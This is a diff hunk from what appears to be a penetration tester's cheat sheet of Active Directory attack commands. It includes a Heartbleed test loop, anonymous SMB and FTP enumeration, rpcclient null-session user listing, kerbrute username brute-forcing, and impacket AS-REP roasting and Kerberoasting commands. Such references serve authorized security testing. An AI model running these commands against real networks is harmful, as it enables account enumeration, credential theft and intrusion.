@@ -168,7 +168,7 @@ while true; do ssltest.py $TARGET |grep -v '00 00 00 00 00 00 00 00 00 00 00 00 
 nxc smb hosts -u 'anonymous' -p '' --shares
 nxc ftp hosts -u 'anonymous' -p '' --ls
 nmap -iL hosts --script "ldap* and not brute" -p 389 | awk '/Nmap scan report/{ip=$NF} /dnsHostName/{h[ip]=h[ip] ? h[ip]" "$3 : $3} END{for (i in h) print i, h[i]}' | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n
-for ip in $(cat hosts); do echo "========[ $ip ]========"; rpcclient -U "" -N $ip -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]'; echo; done
+for host in $(cat hosts); do echo "================[  $host  ]================"; rpcclient -U "" -N $host -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]'; echo; done
 kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
